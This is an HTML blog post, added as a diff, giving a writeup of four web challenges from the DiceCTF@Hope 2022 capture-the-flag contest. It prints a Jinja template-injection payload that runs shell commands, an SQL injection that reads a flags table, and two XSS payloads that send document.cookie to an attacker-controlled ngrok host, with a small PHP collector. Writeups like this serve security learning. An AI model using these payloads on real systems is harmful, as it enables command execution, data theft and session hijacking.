@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Writeup for web challenges from diceCTF @Hope 2022">
+    <title>j3seer</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+    <header>
+
+  <nav>
+    <ul>
+      
+      
+      <li class="pull-left ">
+        <a href="https://j3seer.github.io/">~/j3seer
+
+          https://j3seer.github.io/
+          
+        </a>
+      </li>
+      
+      
+      <li class="pull-left current">
+        <a href="/posts">~/posts</a>
+      </li>
+      
+      
+      <li class="pull-left ">
+        <a href="/whoami">~/whoami</a>
+      </li>
+      
+
+      
+      
+      <li class="pull-right">
+        <a href="/index.xml">~/feed</a>
+      </li>
+      
+
+    </ul>
+  </nav>
+</header>
+
+  </head>
+
+  <body>
+    <br/>
+
+
+<div class="article-meta">
+
+  <div class="article-neta-content">
+
+  <h1><span class="title">DiceCTF@Hope 2022 - Writeup</span></h1>
+  
+  
+  <h2 class="date">2022/09/29</h2>
+  <p class="terms">
+    
+    
+    
+    
+    Tags: <a href="/tags/ssti">ssti</a> <a href="/tags/sql-injection">sql injection</a> <a href="/tags/xss">xss</a> <a href="/tags/mathjax">mathjax</a> 
+    
+    
+  </p>
+  </div>
+  
+    <div style="content: ''; position: absolute; 
+                top: 0; bottom: 0; left: 0; right: 0; z-index: 1; 
+                background-image: url('/images/cat.png'); 
+                background-repeat: no-repeat; background-size:cover; opacity: 0.5;"></div>
+
+
+</div>
+
+
+
+<div class="content-wrapper">
+  <main>
+    <p>Mostly solved the web challenges with Task_Hashed</p>
+<hr>
+<h2 id="reverser">Reverser</h2>
+<p>the website is a text reverser and from the source code we can tell its an SSTI so we just have to put a regular SSTI payload but just reversed</p>
+<p>regular payload:</p>
+<pre tabindex="0"><code>{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}}
+
+{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag-ccba9605-afeb-49a6-8aac-d56bac20705b.txt&#39;).read()}}
+</code></pre><p>supplied reversed payload:</p>
+<pre tabindex="0"><code>}}  )(daer.)&#39;sl&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc {{
+    
+}})(daer.)&#39;txt.b50702cab65d-caa8-6a94-befa-5069abcc-galf tac&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc{{
+</code></pre><hr>
+<h2 id="pastebin">Pastebin</h2>
+<p>the important part of this challenge is :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (paste<span style="color:#ff79c6">.</span>search(<span style="color:#ff79c6">/&lt;.*&gt;/</span>) <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> res<span style="color:#ff79c6">.</span>redirect(<span style="color:#f1fa8c">&#39;/flash?message=Illegal characters in paste!&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>My solution :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">x</span> <span style="color:#50fa7b">onerror</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">javascript:document.location=&#39;http://37b0-41-225-85-6.ngrok.io/ok.php?c=&#39;+document.cookie;</span>
+</span></span></code></pre></div><p>PS : the reason this works is because the browser will automatically try to fill in with the &gt; tag</p>
+<p>with ok.php :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php 
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$cookies</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;c&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><hr>
+<h2 id="oeps">oeps</h2>
+<p>this challenge requires to put a palindrome string to add them to the pending table</p>
+<p>notice there&rsquo;s two ways we can control user input. either search for approved sentences or pass our own but it has to be a palindrome</p>
+<p>since the search is blocking special chars we can try with the pending sentences input</p>
+<p>so we can try some sql injections</p>
+<p>this is what the query looked like</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>connection<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        insert into pending (user, sentence) values (&#39;</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;, &#39;</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    &#39;&#39;&#39;</span> <span style="color:#ff79c6">%</span> (
+</span></span><span style="display:flex;"><span>        token,
+</span></span><span style="display:flex;"><span>        submission
+</span></span><span style="display:flex;"><span>))
+</span></span></code></pre></div><p>payload: <code>')--</code>
+payload supplied : <code>')---)'</code></p>
+<p>and we can see we get a blank input meaning our payload worked! and we know the flag is in the flags table so we can use the <code>||(query)||</code> to get an element from another table</p>
+<p>payload : <code>%'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELES(||'% </code></p>
+<p>the final query looks like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff79c6">insert</span> <span style="color:#ff79c6">into</span> pending (<span style="color:#ff79c6">user</span>, sentence) <span style="color:#ff79c6">values</span> (<span style="color:#f1fa8c">&#39;1234&#39;</span>, <span style="color:#f1fa8c">&#39;%&#39;</span><span style="color:#ff79c6">||</span>(<span style="color:#ff79c6">SELECT</span> flag <span style="color:#ff79c6">FROM</span> flags)<span style="color:#ff79c6">||</span><span style="color:#f1fa8c">&#39;%&#39;</span>);<span style="color:#6272a4">---;)&#39;%&#39;||)sgalf MORF galf TCELES(||&#39;%&#39;);
+</span></span></span></code></pre></div><pre tabindex="0"><code>flag : hope{ecid_gnivlovni_semordnilap_fo_kniht_ton_dluoc}
+</code></pre><hr>
+<h2 id="mk">mk</h2>
+<p>Abusing MathJax renderer for an xss by supplying the source to the mathjax file</p>
+<p>PS: the reason this works is because the mathjax renderer parses the script provided and executes it, otherwise if u change the src to something else that doesnt render it , it wouldn&rsquo;t work ( try it locally )</p>
+<p>payload :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>script src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://mk.mc.ax/MathJax/MathJax.js&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#8be9fd;font-style:italic">document</span>.location<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;http://02f6-41-225-148-43.ngrok.io/ok.php?c=&#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">document</span>.cookie;<span style="color:#ff79c6">&lt;</span>/script&gt;
+</span></span></code></pre></div><p>with ok.php :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php 
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$cookies</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;c&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div>
+    <a href="/"> >> Home</a>
+  </main>
+</div>
+    <footer>
+      
+<script>
+(function() {
+  function center_el(tagName) {
+    var tags = document.getElementsByTagName(tagName), i, tag;
+    for (i = 0; i < tags.length; i++) {
+      tag = tags[i];
+      var parent = tag.parentElement;
+      
+      if (parent.childNodes.length === 1) {
+        
+        if (parent.nodeName === 'A') {
+          parent = parent.parentElement;
+          if (parent.childNodes.length != 1) continue;
+        }
+        if (parent.nodeName === 'P') parent.style.textAlign = 'center';
+      }
+    }
+  }
+  var tagNames = ['img', 'embed', 'object'];
+  for (var i = 0; i < tagNames.length; i++) {
+    center_el(tagNames[i]);
+  }
+})();
+</script>
+
+      
+      <hr/>
+      <a href="https://github.com/j3seer">Github</a> | <a href="https://x.com/@j3seer">Twitter</a>
+      
+    </footer>
+  </body>
+</html>
+
